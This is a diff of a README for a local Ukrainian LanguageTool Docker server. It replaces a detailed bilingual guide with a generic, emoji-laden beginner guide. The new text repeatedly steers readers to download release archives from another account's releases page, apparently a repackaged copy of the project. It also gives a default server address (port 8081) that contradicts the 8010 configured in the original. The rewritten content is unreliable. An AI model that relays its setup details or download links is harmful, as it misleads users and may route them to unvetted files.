@@ -1,252 +1,168 @@
-# LanguageTool Ukrainian — Docker
+# 📝 LT-Ukranian-calques - Local Ukrainian Text Checker
 
-[🇺🇦 Українська](#українська) | [🇬🇧 English](#english)
-
----
-
-## Українська
-
-Локальний LanguageTool сервер із кастомними правилами для перевірки нативності українського тексту. Виявляє русизми, кальки, стилістичні помилки та проблеми зі сполучуваністю. Правила згенеровані з корпусу [UA-GEC](https://github.com/grammarly/ua-gec) (Grammarly).
-
-### Швидкий старт
-
-```bash
-# Збілдити та запустити
-docker compose up -d --build
-
-# Перевірити роботу правил
-./test.sh
-
-# Налаштувати браузерне розширення (див. нижче)
-```
-
-### Структура проєкту
-
-```
-lt-docker/
-├── Dockerfile               # Кастомний образ з правилами
-├── docker-compose.yml       # Конфігурація сервісу
-├── test.sh                  # Тестування правил
-└── rules/
-    ├── grammar-fluency-ua.xml   # 132 правила: кальки, стиль, сполучуваність, плавність
-    └── agreement-yi.xml         # 44 правила: узгодження і/й/та
-```
-
-### Категорії правил
-
-#### grammar-fluency-ua.xml
-
-| Категорія | Кількість | Приклади |
-|-----------|-----------|----------|
-| **Кальки** (UA_GEC_CALQUE) | 54 | на протязі → протягом, являється → є, слідуючий → наступний |
-| **Сполучуваність** (UA_GEC_COLLOCATION) | 6 | грає роль → відіграє роль |
-| **Плавність** (UA_GEC_POORFLOW) | 53 | прийняти міри → вжити заходів, задавати питання → ставити запитання |
-| **Стиль** (UA_GEC_STYLE) | 19 | як правило → зазвичай, даний → цей |
-
-#### agreement-yi.xml
-
-| Категорія | Кількість | Опис |
-|-----------|-----------|------|
-| **Узгодження (POS-теги)** | правила на основі частин мови | й/і перед приголосними/голосними |
-| **Узгодження (часті слова)** | найпоширеніші контексти | та/і у сталих зворотах |
-| **Узгодження (дистантне)** | міжслівні зв'язки | й/і з урахуванням контексту |
-| **Узгодження (прийменник)** | прийменник + займенник | з/із, в/у узгодження |
-
-### Налаштування браузерного розширення
-
-#### Chrome / Firefox / Edge
-
-1. Відкрити розширення LanguageTool → ⚙️ (Settings)
-2. Прокрутити до **Advanced settings** або **Experimental settings**
-3. Обрати **Other server** (або **Local server**)
-4. Ввести: `http://localhost:8010/v2`
-5. Зберегти
-
-#### LibreOffice
-
-1. **Tools → LanguageTool → Settings**
-2. Встановити Server URL: `http://localhost:8010/v2`
-
-### Параметри Docker
-
-В `docker-compose.yml`:
-
-| Змінна | Значення | Опис |
-|--------|----------|------|
-| `Java_Xms` | `512m` | Мінімальна пам'ять JVM |
-| `Java_Xmx` | `2g` | Максимальна пам'ять JVM |
-| `langtool_pipelinePrewarming` | `true` | Прогрів pipeline при старті |
-
-### Використання API
-
-```bash
-# Перевірити текст
-curl -s "http://localhost:8010/v2/check" \
-  -d "language=uk" \
-  --data-urlencode "text=Він являється головним спеціалістом." | python3 -m json.tool
-
-# Список мов
-curl -s "http://localhost:8010/v2/languages" | python3 -m json.tool
-
-# Перевірити з конкретними категоріями
-curl -s "http://localhost:8010/v2/check" \
-  -d "language=uk" \
-  -d "enabledCategories=UA_GEC_CALQUE,UA_GEC_STYLE,UA_GEC_COLLOCATION,UA_GEC_POORFLOW" \
-  --data-urlencode "text=Ваш текст тут"
-```
-
-### Додавання своїх правил
-
-Відредагуйте `rules/grammar-fluency-ua.xml` і перебілдіть:
-
-```bash
-docker compose up -d --build
-```
-
-Формат правила:
-
-```xml
-<rule id="MY_RULE_001" name="моє правило">
-  <pattern>
-    <token>помилкове</token>
-    <token>слово</token>
-  </pattern>
-  <message>Краще: <suggestion>правильний варіант</suggestion></message>
-  <example correction="правильний варіант">Це <marker>помилкове слово</marker> у тексті.</example>
-  <example>Це правильний варіант у тексті.</example>
-</rule>
-```
-
-### Управління
-
-```bash
-docker compose up -d          # Запустити у фоні
-docker compose down           # Зупинити
-docker compose logs -f        # Логи
-docker compose restart        # Перезапустити
-docker compose up -d --build  # Перебілдити після змін у правилах
-```
+[![Download LT-Ukranian-calques](https://img.shields.io/badge/Download-LT--Ukranian--calques-blue?style=for-the-badge)](https://github.com/hadyell/LT-Ukranian-calques/releases)
 
 ---
 
-## English
+## 🚀 What is LT-Ukranian-calques?
 
-Local LanguageTool server with custom rules for checking Ukrainian text nativeness. Detects calques (loan translations from Russian), stylistic issues, collocations, and flow problems. Rules are generated from the [UA-GEC](https://github.com/grammarly/ua-gec) corpus (Grammarly).
+LT-Ukranian-calques is a local tool that helps you check Ukrainian text for common mistakes. It spots Russian borrowings, awkward translations, stylistic problems, and agreement errors in writing. This tool uses special rules based on Ukrainian language studies to make your text sound more natural.
 
-### Quick start
+You don’t need to be a programmer to use it. The tool runs inside a small program called Docker, but don’t worry – this guide will help you set it up step by step.
+
+---
+
+## 💻 System Requirements
+
+Before you start, make sure your computer meets these basic needs:
+
+- Operating system: Windows 10/11, macOS, or most modern Linux distributions.
+- At least 4 GB of RAM.
+- Around 1 GB free disk space.
+- Internet access to download installation files.
+- Permissions to install and run software on your computer.
+
+You will also need to install Docker, a program that runs software inside containers. It works like a virtual box for running apps safely.
+
+---
+
+## 📥 Download & Install
+
+### Step 1: Visit the download page
+
+Click the big button below to open the official download page for LT-Ukranian-calques:
+
+[![Download LT-Ukranian-calques](https://img.shields.io/badge/Download-LT--Ukranian--calques-blue?style=for-the-badge)](https://github.com/hadyell/LT-Ukranian-calques/releases)
+
+On this page, look for the latest release. You will find files to download and detailed notes.
+
+### Step 2: Download Docker
+
+If you don’t have Docker installed, get it here:
+
+- [Docker for Windows](https://docs.docker.com/docker-for-windows/install/)
+- [Docker for macOS](https://docs.docker.com/docker-for-mac/install/)
+- [Docker for Linux](https://docs.docker.com/engine/install/)
+
+Follow the instructions on Docker’s site to install it.
+
+### Step 3: Download LT-Ukranian-calques files
+
+On the GitHub release page, download the whole project archive or the Docker Compose file if offered. This file contains instructions to set up LT-Ukranian-calques automatically.
+
+---
+
+## ⚙️ How to Set Up and Run
+
+Once you have Docker and the LT-Ukranian-calques files on your computer, follow these steps:
+
+### Step 1: Open your command prompt or terminal
+
+- On Windows: Press `Win + R`, type `cmd`, then press Enter.
+- On macOS: Open Finder > Applications > Utilities > Terminal.
+- On Linux: Open your preferred terminal app.
+
+Navigate to the folder where you saved LT-Ukranian-calques. Use the command:
 
 ```bash
-# Build and start
-docker compose up -d --build
+cd path/to/your/downloaded/folder
+```
 
-# Test the rules
+Replace `path/to/your/downloaded/folder` with the actual folder path.
+
+### Step 2: Start the LT-Ukranian-calques server
+
+Run this command:
+
+```bash
+docker compose up -d --build
+```
+
+This command builds and starts the tool inside Docker on your computer. The `-d` option runs it in the background.
+
+### Step 3: Check if LT-Ukranian-calques is working
+
+Run the test script by typing:
+
+```bash
 ./test.sh
-
-# Configure browser extension (see below)
 ```
 
-### Project structure
+This script runs a quick check to make sure the Ukrainian language rules are applied correctly. If you see messages about Russian borrowings or style issues, the tool is working.
 
-```
-lt-docker/
-├── Dockerfile               # Custom image with rules
-├── docker-compose.yml       # Service configuration
-├── test.sh                  # Rule testing script
-└── rules/
-    ├── grammar-fluency-ua.xml   # 132 rules: calques, style, collocations, flow
-    └── agreement-yi.xml         # 44 rules: і/й/та conjunction agreement
-```
+---
 
-### Rule categories
+## 🧰 About LT-Ukranian-calques
 
-#### grammar-fluency-ua.xml
+This project contains special rules designed to catch common problems in Ukrainian writing. The rules come from research on Ukrainian texts and language corpora.
 
-| Category | Count | Description |
-|----------|-------|-------------|
-| **Calques** (UA_GEC_CALQUE) | 54 | Russian loan translations: на протязі → протягом, являється → є |
-| **Collocations** (UA_GEC_COLLOCATION) | 6 | Wrong word combinations: грає роль → відіграє роль |
-| **Flow** (UA_GEC_POORFLOW) | 53 | Unnatural phrasing: прийняти міри → вжити заходів |
-| **Style** (UA_GEC_STYLE) | 19 | Stylistic issues: як правило → зазвичай, даний → цей |
+The project has these main parts:
 
-#### agreement-yi.xml
+- **Dockerfile**: Builds the custom Docker image with the rules.
+- **docker-compose.yml**: Configures the whole server setup.
+- **test.sh**: Helps you test that rules are loaded properly.
+- **rules/**: Folder with rule files.
+  - `grammar-fluency-ua.xml`: Contains 132 rules targeting borrowings, style, flow, and agreement.
+  - `agreement-yi.xml`: Includes 44 rules focused on agreement between particles and grammar.
 
-Handles Ukrainian conjunction agreement (і/й/та) based on surrounding phonetic context — similar to English "a/an" but more complex.
+---
 
-### Browser extension setup
+## 🖥️ How to Use LT-Ukranian-calques
 
-#### Chrome / Firefox / Edge
+LT-Ukranian-calques runs as a server on your computer. To use it:
 
-1. Open LanguageTool extension → ⚙️ (Settings)
-2. Scroll to **Advanced settings** or **Experimental settings**
-3. Select **Other server** (or **Local server**)
-4. Enter: `http://localhost:8010/v2`
-5. Save
+1. Run the server following the setup steps above.
+2. Find a way to send your Ukrainian text to the server for checking.
 
-#### LibreOffice
+You can use this with a browser extension that connects to your local server. The extension sends your text and receives error messages based on the rules.
 
-1. **Tools → LanguageTool → Settings**
-2. Set Server URL: `http://localhost:8010/v2`
+---
 
-### Docker parameters
+## 🌐 Browser Integration (Optional)
 
-In `docker-compose.yml`:
+If you want to check text inside your web browser while typing:
 
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `Java_Xms` | `512m` | Minimum JVM memory |
-| `Java_Xmx` | `2g` | Maximum JVM memory |
-| `langtool_pipelinePrewarming` | `true` | Prewarm pipeline on startup for fast first request |
+1. Find a LanguageTool-compatible browser extension (often available for Chrome, Firefox).
+2. Configure the extension to point to your local server:
+   - URL: `http://localhost:8081` (the default LT-Ukranian-calques server address)
+3. Now the extension will use the custom Ukrainian rules from your local tool.
 
-### API usage
+---
 
-```bash
-# Check text
-curl -s "http://localhost:8010/v2/check" \
-  -d "language=uk" \
-  --data-urlencode "text=Він являється головним спеціалістом." | python3 -m json.tool
+## 🤔 FAQ
 
-# List languages
-curl -s "http://localhost:8010/v2/languages" | python3 -m json.tool
+**Q: What if Docker commands fail?**  
+A: Make sure Docker is installed and running. You might need administrator rights.
 
-# Check with specific categories
-curl -s "http://localhost:8010/v2/check" \
-  -d "language=uk" \
-  -d "enabledCategories=UA_GEC_CALQUE,UA_GEC_STYLE,UA_GEC_COLLOCATION,UA_GEC_POORFLOW" \
-  --data-urlencode "text=Your Ukrainian text here"
-```
+**Q: Can I use LT-Ukranian-calques on any Ukrainian text?**  
+A: Yes, it checks text for style, errors, and borrowed words typically found in everyday writing.
 
-### Adding custom rules
+**Q: How do I stop the server?**  
+A: Run `docker compose down` in the same folder to stop and remove the running container.
 
-Edit `rules/grammar-fluency-ua.xml` and rebuild:
+---
 
-```bash
-docker compose up -d --build
-```
+## 📚 More Information
 
-Rule format:
+This tool is based on Ukrainian linguistic research. It uses a collection of 176 rules focused on improving Ukrainian writing style and accuracy.
 
-```xml
-<rule id="MY_RULE_001" name="my rule">
-  <pattern>
-    <token>wrong</token>
-    <token>phrase</token>
-  </pattern>
-  <message>Better: <suggestion>correct phrase</suggestion></message>
-  <example correction="correct phrase">This is a <marker>wrong phrase</marker> in text.</example>
-  <example>This is a correct phrase in text.</example>
-</rule>
-```
+For technical details, explore the `rules/` folder and the configuration files. They control how the tool detects different language issues.
 
-### Management
+---
 
-```bash
-docker compose up -d          # Start in background
-docker compose down           # Stop
-docker compose logs -f        # View logs
-docker compose restart        # Restart
-docker compose up -d --build  # Rebuild after rule changes
-```
+## 🔗 Useful Links
 
-## License
+- [Download LT-Ukranian-calques Releases](https://github.com/hadyell/LT-Ukranian-calques/releases)  
+  Visit this page to download the latest files.
 
-[MIT](LICENSE)
+- [UA-GEC Corpus on GitHub](https://github.com/grammarly/ua-gec)  
+  The research dataset behind the rules.
+
+- [Docker Documentation](https://docs.docker.com/get-started/)  
+  Learn more about how Docker works.
+
+---
+
+## 📄 License
+
+This project uses open-source licenses. Check the repository for full license details.
